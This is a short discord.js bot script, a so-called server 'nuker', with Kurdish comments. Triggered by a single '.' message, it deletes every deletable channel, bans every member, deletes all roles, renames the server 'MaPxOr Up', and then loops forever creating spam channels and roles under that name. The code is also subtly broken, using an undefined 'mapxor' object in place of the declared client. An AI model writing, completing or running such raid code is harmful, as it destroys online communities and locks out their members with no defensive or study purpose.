const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = ".";
mapxor.on("message", message => {
  if (message.content === ".") {
    if (message.channel.guild) {
      message.guild.channels.forEach(c => {
        if (c.deletable) {
          c.delete();
        }
      });
      message.guild.members.forEach(m => {
        m.ban();
      });
      message.guild.roles.forEach(r => {
        r.delete();
      });
      message.guild.setName("MaPxOr Up");////nawek dane bo sar server 
      setInterval(function() {
        message.guild.createChannel("MaPxOr Up", "text");///////bo channel 
        message.guild.createChannel("MaPxOr Up", "voice");////bo voice
        message.guild.createRole({ name: "MaPxOr Up" });////nawek dane bo role kan
      });
    }
  }
});

 mapxor.login("")
